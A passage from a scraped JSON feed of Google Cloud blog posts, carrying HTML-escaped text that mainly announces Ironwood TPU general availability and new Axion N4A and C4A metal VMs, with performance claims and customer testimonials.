style=\"vertical-align: baseline;\">JAX Debugger (</strong><code><strong style=\"vertical-align: baseline;\">jax.debug</strong></code><strong style=\"vertical-align: baseline;\">):</strong><span style=\"vertical-align: baseline;\"> Enables </span><code><strong style=\"vertical-align: baseline;\">print</strong></code><span style=\"vertical-align: baseline;\"> and breakpoints from within </span><code><strong style=\"vertical-align: baseline;\">jit</strong></code><span style=\"vertical-align: baseline;\">-compiled functions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TPU Monitoring Library:</strong><span style=\"vertical-align: baseline;\"> A real-time diagnostic dashboard (analogous to </span><code><strong style=\"vertical-align: baseline;\">nvidia-smi</strong></code><span style=\"vertical-align: baseline;\">) for live debugging of HBM utilization, MXU activity, and running processes.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Beyond performance optimization, developers and infra admins can view fleet efficiency and goodput metrics at various levels (e.g., job, reservation) to ensure maximum utilization of their TPU infrastructure.  </span></p>\n<h3><strong style=\"vertical-align: baseline;\">4. Conclusion</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Ironwood stack is a complete, system-level co-design, from the silicon to the software. It delivers performance through a dual-pronged strategy: the </span><strong style=\"vertical-align: baseline;\">XLA compiler</strong><span style=\"vertical-align: baseline;\"> provides broad, \"out-of-the-box\" optimization, while the </span><strong style=\"vertical-align: baseline;\">Pallas and Mosaic stack</strong><span style=\"vertical-align: baseline;\"> enables hand-tuned kernel performance.</span></p>\n<p><span style=\"vertical-align: baseline;\">This entire co-designed platform is accessible to all developers, providing first-class, native support for both the </span><strong style=\"vertical-align: baseline;\">JAX </strong><span style=\"vertical-align: baseline;\">and the </span><strong style=\"vertical-align: baseline;\">PyTorch ecosystem</strong><span style=\"vertical-align: baseline;\">. Whether you are pre-training a massive model, running complex RL alignment, or serving at scale, Ironwood provides a direct, resilient, and high-performance path from idea to supercomputer.</span></p>\n<p><span style=\"vertical-align: baseline;\">Get started today with </span><a href=\"https://docs.vllm.ai/projects/tpu/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">vLLM on TPU</strong></a><span style=\"vertical-align: baseline;\"> for inference and </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\"> for pre-training and post-training.</span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads/",
        "title": "Announcing Ironwood TPUs General Availability and new Axion VMs to power the age of inference",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/3_WZEo7he.max-600x600.png",
        "author": "Mark Lohmeyer",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today’s frontier models, including Google’s Gemini, Veo, Imagen, and Anthropic’s Claude train </span><span style=\"vertical-align: baseline;\">and serve o</span><span style=\"vertical-align: baseline;\">n Tensor Processing Units (TPUs). For many organizations, the focus is shifting from training these models to powering useful, responsive interactions with them. Constantly shifting model architectures, the rise of agentic workflows, plus near-exponential growth in demand for compute, define this new </span><strong style=\"vertical-align: baseline;\">age of inference</strong><span style=\"vertical-align: baseline;\">. In particular, agentic workflows that require orchestration and tight coordination between general-purpose compute and ML acceleration are creating new opportunities for custom silicon and vertically co-optimized system architectures. </span></p>\n<p><span style=\"vertical-align: baseline;\">We have been preparing for this transition for some time and today, we are announcing the availability of three new products built on custom silicon that deliver exceptional performance, lower costs, and enable new capabilities for inference and agentic workloads:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Ironwood</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">our seventh generation TPU, will be generally available in the coming weeks</strong><span style=\"vertical-align: baseline;\">. Ironwood is purpose-built for the most demanding workloads: from large-scale model training and complex reinforcement learning (RL) to high-volume, low-latency AI inference and model serving. It offers a 10X peak performance improvement over </span><span style=\"vertical-align: baseline;\">TPU v5p and </span><span style=\"vertical-align: baseline;\">more than 4X better performance per chip for both training and inference workloads compared to TPU v6e (Trillium), making Ironwood our most powerful and energy-efficient custom silicon to date.</span></li>\n<li><strong style=\"vertical-align: baseline;\">New Arm</strong><span style=\"vertical-align: baseline;\">®</span><strong style=\"vertical-align: baseline;\">-based Axion instances. N4A</strong><span style=\"vertical-align: baseline;\">, our most cost-effective N series virtual machine to date, is </span><strong style=\"vertical-align: baseline;\">now in preview</strong><span style=\"vertical-align: baseline;\">. N4A offers up to 2x better price-performance than comparable current-generation x86-based VMs. We are also pleased to announce </span><strong style=\"vertical-align: baseline;\">C4A metal</strong><span style=\"vertical-align: baseline;\">,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">our first Arm-based bare metal instance</span><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">will be </span><strong style=\"vertical-align: baseline;\">coming soon in preview.</strong></li>\n</ul></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=aQxcomQDHcw\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">youtube video</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=aQxcomQDHcw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood and these new Axion instances are just the latest in a long history of custom silicon innovation at Google, including TPUs, Video Coding Units (VCU) for YouTube, and five generations of Tensor chips for mobile. In each case, we build these processors to enable breakthroughs in performance that are only possible through deep, system-level co-design, with model research, software, and hardware development under one roof. This is how we built the first TPU ten years ago, which in turn unlocked the invention of the Transformer eight years ago — the very architecture that powers most of modern AI. It has also influenced more recent advancements like our </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\"> architecture, and advanced </span><a href=\"https://cloud.google.com/blog/topics/systems/enabling-1-mw-it-racks-and-liquid-cooling-at-ocp-emea-summit?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">liquid cooling</span></a><span style=\"vertical-align: baseline;\"> that we’ve deployed at GigaWatt scale with fleet-wide uptime of ~99.999% since 2020.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_E4cJ2SM.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: An Ironwood board showing three Ironwood TPUs connected to liquid cooling.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_BWW5xwl.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Third-generation Cooling Distribution Units, providing liquid cooling to an Ironwood superpod.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Ironwood: The fastest path from model training to planet-scale inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The early response to Ironwood is </span><span style=\"vertical-align: baseline;\">overwhelmingly enthusiastic. Anthropic is compelled by the impressive price-performance gains that accelerate their path from training massive Claude models to serving them to millions of users. In fact, Anthropic </span><a href=\"https://www.googlecloudpresscorner.com/2025-10-23-Anthropic-to-Expand-Use-of-Google-Cloud-TPUs-and-Services\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">plans to access up to 1 million TPUs</span></a><span style=\"vertical-align: baseline;\">:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Anthropic\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Anthropic.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Our customers, from Fortune 500 companies to startups, depend on Claude for their most critical work. As demand continues to grow exponentially, we're increasing our compute resources as we push the boundaries of AI research and product development. Ironwood’s improvements in both inference performance and training scalability will help us scale efficiently while maintaining the speed and reliability our customers expect.\"</i> – <b>James Bradbury, Head of Compute, Anthropic</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood is being used by organizations of all sizes and across industries:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"lightricks\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/lightricks.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Our mission at Lightricks is to define the cutting edge of open creativity, and that demands AI infrastructure that eliminates friction and cost at scale. We relied on Google Cloud TPUs and its massive ICI domain to achieve our breakthrough training efficiency for LTX-2, our leading open-source multimodal generative model. Now, as we enter the age of inference, our early testing makes us highly enthusiastic about Ironwood. We believe that Ironwood will enable us to create more nuanced, precise, and higher-fidelity image and video generation for our millions of global customers.\"</i> - <b>Yoav HaCohen, PhD, Director of Foundational Generative AI Research, Lightricks</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"essential ai\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/essential_ai.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“At Essential AI, our mission is to build powerful, open frontier models. We need massive, efficient scale, and Google Cloud's Ironwood TPUs deliver exactly that. The platform was incredibly easy to onboard, allowing our engineers to immediately leverage its power and focus on accelerating AI breakthroughs.\"</i> - <b>Philip Monk, Infrastructure Lead, Essential AI</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">System-level design maximizes inference performance, reliability, and cost </span></h3>\n<p><span style=\"vertical-align: baseline;\">TPUs are a key component of </span><a href=\"https://cloud.google.com/solutions/ai-hypercomputer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</span></a><span style=\"vertical-align: baseline;\">, our integrated supercomputing system that brings together compute, networking, storage, and software to improve system-level performance and efficiency. At the macro level, according to a recent IDC report, AI Hypercomputer customers achieved on average 353% three-year ROI, 28% lower IT costs, and 55% more efficient IT teams.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ironwood TPUs will help customers push the limits of scale and efficiency even further. When you deploy TPUs, the system connects each individual chip to each other, creating a pod — allowing the interconnected TPUs to work as a single unit. With Ironwood, we can scale up to </span><strong style=\"vertical-align: baseline;\">9,216 chips in a superpod</strong><span style=\"vertical-align: baseline;\"> linked with breakthrough Inter-Chip Interconnect (ICI) networking at 9.6 Tb/s. This massive connectivity allows thousands of chips to quickly communicate with each other and access a staggering 1.77 Petabytes of shared High Bandwidth Memory (HBM), overcoming data bottlenecks for even the most demanding models.</span><strong style=\"vertical-align: baseline;\"> </strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_WZEo7he.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Part of an Ironwood superpod, directly connecting 9,216 Ironwood TPUs in a single domain.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At that scale, services demand uninterrupted availability. That’s why our Optical Circuit Switching (OCS) technology acts as a dynamic, reconfigurable fabric, instantly routing around interruptions to restore the workload while your services keep running. And when you need more power, Ironwood scales across pods into clusters of hundreds of thousands of TPUs.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_fFI906U.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Jupiter data center network enables the connection of multiple Ironwood superpods into clusters of hundreds of thousands of TPUs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">The AI Hypercomputer advantage: Hardware and software co-designed for faster, more efficient outcomes</span></h3>\n<p><span style=\"vertical-align: baseline;\">On top of this hardware is a co-designed software layer, where our goal is to maximize Ironwood’s massive processing power and memory, and make it easy to use throughout the AI lifecycle. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">To improve fleet efficiency and operations, we’re excited to announce that TPU customers can now benefit from </span><strong style=\"vertical-align: baseline;\">Cluster Director capabilities</strong><span style=\"vertical-align: baseline;\"> in Google Kubernetes Engine. This includes advanced maintenance and topology awareness for intelligent scheduling and highly resilient clusters.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For pre-training and post-training, we’re also sharing</span><strong style=\"vertical-align: baseline;\"> new enhancements to </strong><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">a high-performance, open source LLM framework, to make it easier to implement the latest training and reinforcement learning optimization techniques, such as Supervised Fine-Tuning (SFT) and Generative Reinforcement Policy Optimization (GRPO).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For inference, we recently announced enhanced support for TPUs in </span><a href=\"https://cloud.google.com/blog/products/compute/in-q3-2025-ai-hypercomputer-adds-vllm-tpu-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vLLM</span></a><span style=\"vertical-align: baseline;\">, allowing developers to switch between GPUs and TPUs, or run both, with only a few minor configuration changes, and </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, which intelligently load balances across TPU servers to reduce time-to-first-token (TTFT) latency by up to 96% and serving costs by up to 30%.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Our software layer is what enables AI Hypercomputer’s high performance and reliability for training, tuning, and serving demanding AI workloads at scale. Thanks to deep integrations across the stack — from data-center-wide hardware optimizations to open software and managed services— Ironwood TPUs are our most powerful and energy-efficient TPUs to date. Learn more about our approach to hardware and software co-design </span><a href=\"https://cloud.google.com/blog/products/compute/inside-the-ironwood-tpu-codesigned-ai-stack\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.  </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Axion: Redefining general-purpose compute </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Building and serving modern applications requires both highly specialized accelerators and powerful, efficient general-purpose compute. This was our vision for Axion, our custom Arm Neoverse®-based CPUs, which we designed to deliver compelling performance, cost and energy efficiency for everyday workloads. </span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are expanding our Axion portfolio with:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">N4A</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">preview</strong><span style=\"vertical-align: baseline;\">), our second general-purpose Axion VM, which is ideal for microservices, containerized applications, open-source databases, batch, data analytics, development environments, experimentation, data preparation and web serving jobs that make AI applications possible. Learn more about N4A </span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">C4A metal (in preview soon), </strong><span style=\"vertical-align: baseline;\">our first Arm-based bare-metal instance, which provides dedicated physical servers for specialized workloads such Android development, automotive in-car systems, software with strict licensing requirements, scale test farms, or running complex simulations. </span><span style=\"vertical-align: baseline;\">Learn more about C4A metal </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_nH8lIVk.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With today's announcements, the Axion portfolio now includes three powerful options, N4A, C4A and C4A metal. Together, the C and N series allow you to lower the total cost of running your business without compromising on performance or workload-specific requirements.<br /><br /></span></p>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 100%;\"><colgroup><col style=\"width: 23.7818%;\" /><col style=\"width: 21.0548%;\" /><col style=\"width: 55.1634%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Axion-based Instance</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Optimized for</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Key Features</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N4A (preview)</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Price-performance and flexibility</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 64 vCPUs, 512GB of DDR5 Memory, and 50 Gbps networking, with support for Custom Machine Types, Hyperdisk Balanced and Throughput storage.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4A Metal (in preview soon) </span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Specialized workloads, such as Hypervisors and native Arm development</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 96 vCPUs, 768GB of DDR5 Memory, Hyperdisk storage and up to 100Gbps of networking </span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4A</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Consistently high performance</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 72 vCPUs, 576GB of DDR5 Memory, 100Gbps of Tier 1 networking, Titanium SSD with up to 6TB of local capacity, advanced maintenance controls and support for Hyperdisk Balanced, Throughput, and Extreme.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><span style=\"vertical-align: baseline;\">Axion’s inherent efficiency also makes it a valuable option for modern AI workflows. While specialized accelerators like Ironwood handle the complex task of model serving, Axion excels at the operational backbone: supporting high-volume data preparation, ingestion, and running application servers that host your intelligent applications. Axion is already translating into customer impact:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_ZB4gdHF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At Vimeo, we have long relied on Custom Machine Types to efficiently manage our massive video transcoding platform. Our initial tests on the new Axion-based N4A instances have been very compelling, unlocking a new level of efficiency. We've observed a 30% improvement in performance for our core transcoding workload compared to comparable x86 VMs. This points to a clear path for improving our unit economics and scaling our services more profitably, without changing our operational model.\"</i> - <b>Joe Peled, Sr. Director of Hosting &amp; Delivery Ops, Vimeo</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_3I8oyl8.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At ZoomInfo, we operate a massive data intelligence platform where efficiency is paramount. Our core data processing pipelines, which are critical for delivering timely insights to our customers, run extensively on Dataflow and Java services in GKE. In our preview of the new N4A instances, we measured a 60% improvement in price-performance for these key workloads compared to their x86-based counterparts. This allows us to scale our platform more efficiently and deliver more value to our customers, faster.\" -</i> <b>Sergei Koren, Chief Infrastructure Architect, ZoomInfo</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_m4GINGe.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Migrating to Google Cloud's Axion portfolio gave us a critical competitive advantage. We slashed our compute consumption by 20% while maintaining low and stable latency with C4A instances, such as our Supply-Side Platform (SSP) backend service. Additionally, C4A enabled us to leverage Hyperdisk with precisely the IOPS we need for our stateful workloads, regardless of instance size. This flexibility gives us the best of both worlds - allowing us to win more ad auctions for our clients while significantly improving our margins. We're now testing the N4A family by running some of our key workloads that require the most flexibility, such as our API relay service. We are happy to share that several applications running in production are consuming 15% less CPU compared to our previous infrastructure, reducing our costs further, while ensuring that the right instance backs the workload characteristics required.”</i> - <b>Or Ben Dahan, Cloud &amp; Software Architect, Rise</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">A powerful combination for AI and everyday computing</span></h3>\n<p><span style=\"vertical-align: baseline;\">To thrive in an era with constantly shifting model architectures, software, and techniques, you need a combination of </span><strong style=\"vertical-align: baseline;\">purpose-built AI accelerators</strong><span style=\"vertical-align: baseline;\"> for model training and serving, alongside </span><strong style=\"vertical-align: baseline;\">efficient, general-purpose CPUs</strong><span style=\"vertical-align: baseline;\"> for the everyday workloads, including the workloads that support those AI applications. </span></p>\n<p><span style=\"vertical-align: baseline;\">Ultimately, whether you use Ironwood and Axion together or mix and match them with the other </span><a href=\"https://cloud.google.com/products/compute\"><span style=\"text-decoration: underline; vertical-align: baseline;\">compute options</span></a><span style=\"vertical-align: baseline;\"> available on AI Hypercomputer, this system-level approach gives you the ultimate flexibility and capability for the most demanding workloads. </span><strong style=\"vertical-align: baseline;\">Sign up to test </strong><a href=\"https://cloud.google.com/resources/ironwood-tpu-interest?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q2-global-ENT33820-website-cs-ironwood-tpu-interest&amp;utm_content=ironwood_announcement_blog&amp;utm_term=ironwood\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</strong></a><strong style=\"vertical-align: baseline;\">, </strong><strong style=\"vertical-align: baseline;\">Axion </strong><a href=\"https://forms.gle/HYY5FWRKewYuDMB27\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">N4A</strong></a><strong style=\"vertical-align: baseline;\">, or </strong><a href=\"https://forms.gle/tzYAWwMBBhkkR4yHA\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">C4A metal</strong></a><strong style=\"vertical-align: baseline;\"> today.</strong></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview/",
        "title": "Unlock 2x better price-performance with Axion-based N4A VMs, now in preview",
        "thumbnail": null,
        "author": "Mo Farhat",
        "track": null,
